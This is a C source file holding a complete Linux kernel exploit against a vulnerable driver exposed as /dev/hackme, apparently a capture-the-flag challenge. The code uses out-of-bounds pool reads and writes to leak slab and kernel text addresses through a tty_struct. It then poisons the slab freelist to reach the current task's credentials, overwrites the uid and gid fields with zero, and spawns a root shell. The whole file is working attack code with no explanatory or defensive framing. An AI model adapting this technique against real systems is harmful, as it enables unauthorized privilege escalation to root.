#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

typedef long long LL;
typedef unsigned long long ULL;

typedef struct {
    unsigned int idx;
    int padding;
    char *user_ptr;
    LL size;
    LL offset;
} arg_struct;

#define MY_MAGIC 0xfaceb00c55661234

#define PAUSE do { scanf("%*c"); } while(0);

// Gadget that needs to adjust
#define KERNEL_TEXT 0
#define CURRENT_TASK 1

ULL gadgets[] = {
    0xffffffff81000000,
    0xffffffff8183a040,
};

void create_pool(int fd, int idx, char *from, LL size)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    arg.user_ptr = from;
    arg.size = size;
    ret = ioctl(fd, 0x30000, &arg);
    if (ret) {
        printf("[x] create_pool: %d\n", ret);
    }
}

void free_pool(int fd, int idx)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    ret = ioctl(fd, 0x30001, &arg);
    if (ret) {
        printf("[x] free_pool: %d\n", ret);
    }
}

void write_pool(int fd, int idx, LL to_offset, char *from, LL size)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    arg.offset = to_offset;
    arg.user_ptr = from;
    arg.size = size;
    ret = ioctl(fd, 0x30002, &arg);
    if (ret) {
        printf("[x] write_pool: %d\n", ret);
    }
}

void read_pool(int fd, int idx, char *to, LL from_offset, LL size)
{
    int ret;
    arg_struct arg;
    arg.idx = idx;
    arg.offset = from_offset;
    arg.user_ptr = to;
    arg.size = size;
    ret = ioctl(fd, 0x30003, &arg);
    if (ret) {
        printf("[x] read_pool: %d\n", ret);
    }
}


void bp(void)
{
    printf("Yo\n");
}

int main(void)
{
    int fd, victim_id, fd_tty, idx;
    char buf[0x400];
    char buf2[0x400];
    char recv_buf[0xb00] = { 0 };
    char *slab_pointer;
    char *current_task_struct;
    char *kernel_text;
    char *current_cred;
    ULL *ullp;
    char target[20] = { 0 };
    char *sh_argv[] = { "/bin/sh", 0 };

    memset(buf, 0x87, 0x400);
    memset(buf2, 0x10, 0x400);

    fd = open("/dev/hackme", O_RDONLY);

    victim_id = 0;

    // Set comm
	strcpy(target,"try2findmep4nda");
	prctl(PR_SET_NAME, target);

    printf("[*] Try 2 find target: %s\n", target);

    create_pool(fd, victim_id, buf, 0x400);
    create_pool(fd, victim_id + 1, buf, 0x400);

    // Validate
    // read_pool(fd, victim_id, recv_buf, 0, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }

    // Overwrite previous pool
    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400);

    // Validate
    // read_pool(fd, victim_id, recv_buf, 0, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }
    
    // Free previous pool :)
    free_pool(fd, victim_id);

    // Leak SLAB pointer
    read_pool(fd, victim_id + 1, recv_buf, -0x400, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }
    slab_pointer = (char *)((ULL *)recv_buf)[0];
    printf("[*] SLAB pointer: %p\n", slab_pointer);
    
    // Allocate tty_struct
    fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);

    // Leak kernel text pointer
    read_pool(fd, victim_id + 1, recv_buf, -0x400, 0x400);
    // for (int i = 0; i < (0x400 / 8); i += 2) {
    //     printf("buf[%d]: %016llx %016llx\n", i, ((ULL *)recv_buf)[i], ((ULL *)recv_buf)[i+1]);
    // }
    kernel_text = (char *)(((ULL *)recv_buf)[3] - 0x625d80);
    printf("[*] Kernel text pointer: %p\n", kernel_text);

    for (int i = 1; i < sizeof(gadgets) / sizeof(ULL); ++i) {
        gadgets[i] = gadgets[i] - gadgets[0] + (ULL)kernel_text;
    }

    printf("[*] current_task: %p\n", (char *)gadgets[CURRENT_TASK]);

    // printf("[*] bp: %p\n", bp);
    PAUSE;
    // bp();

    // Free it
    close(fd_tty);

    // Overwrite next ptr
    ullp = (ULL *)buf2;
    idx = 0;
    ullp[idx++] = gadgets[CURRENT_TASK] + 0xa00;
    
    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400); 
    
    // Allocate
    create_pool(fd, victim_id, buf, 0x400);

    // Validate
    idx = 0;
    ullp[idx++] = MY_MAGIC;

    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400);

    read_pool(fd, victim_id, recv_buf, 0, 8);

    ullp = (ULL *)recv_buf;
    if (ullp[0] != MY_MAGIC) {
        printf("[x] Something wrong...\n");
        return -1;
    }

    // Allocate again, this time we get a object at current_task+0xa00
    create_pool(fd, victim_id + 2, buf, 0x400); 
    
    // Leak current_task task_struct
    read_pool(fd, victim_id + 2, recv_buf, -0xa00, 0xa00);
    current_task_struct = (char *)((ULL *)recv_buf)[0];
    printf("[*] current_task task_struct: %p\n", current_task_struct);

    // Free it
    free_pool(fd, victim_id); 

    // Overwrite next ptr
    ullp = (ULL *)buf2;
    idx = 0;
    ullp[idx++] = (ULL)current_task_struct + 0x3c0 + 0x400;
    
    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400); 

    // Allocate
    create_pool(fd, victim_id, buf, 0x400);

    // Validate
    idx = 0;
    ullp[idx++] = MY_MAGIC;

    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400);

    read_pool(fd, victim_id, recv_buf, 0, 8);

    ullp = (ULL *)recv_buf;
    if (ullp[0] != MY_MAGIC) {
        printf("[x] Something wrong QQ...\n");
        return -1;
    }

    // Allocate again, this time we get a object at current_task_struct + 0x3c0 + 0x400
    create_pool(fd, victim_id + 3, buf, 0x400); 

    // Leak cred address and comm
    read_pool(fd, victim_id + 3, recv_buf, -0x400, 0x400);
    current_cred = (char *)((ULL *)recv_buf)[0];
    printf("[*] current_cred: %p\n", current_cred);
    printf("[*] comm: %s\n", &recv_buf[8]);

    PAUSE;

    // Free it
    free_pool(fd, victim_id); 

    // Overwrite next ptr
    ullp = (ULL *)buf2;
    idx = 0;
    ullp[idx++] = (ULL)current_cred + 0x90;
    
    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400); 

    // Allocate
    create_pool(fd, victim_id, buf, 0x400);

    // Validate
    idx = 0;
    ullp[idx++] = MY_MAGIC;

    write_pool(fd, victim_id + 1, -0x400, buf2, 0x400);

    read_pool(fd, victim_id, recv_buf, 0, 8);

    ullp = (ULL *)recv_buf;
    if (ullp[0] != MY_MAGIC) {
        printf("[x] Something wrong QQ...\n");
        return -1;
    }

    // Allocate again, this time we get a object at current_cred+0x90
    create_pool(fd, victim_id + 4, buf, 0x400); 

    // Read current_cred content
    read_pool(fd, victim_id + 4, recv_buf, -0x90, 0x90);

    // Overwrite current_cred
    ullp = (ULL *)recv_buf;
    idx = 0;
    ullp[idx++] = 3;
    ullp[idx++] = 0;
    ullp[idx++] = 0;
    ullp[idx++] = 0;
    ullp[idx++] = 0;
    ullp[idx++] = 0;
    
    write_pool(fd, victim_id + 4, -0x90, recv_buf, 0x90); 

    PAUSE;

    // Enjoy ROOOOOOOOOOOT shell
    execv("/bin/sh", sh_argv);
}
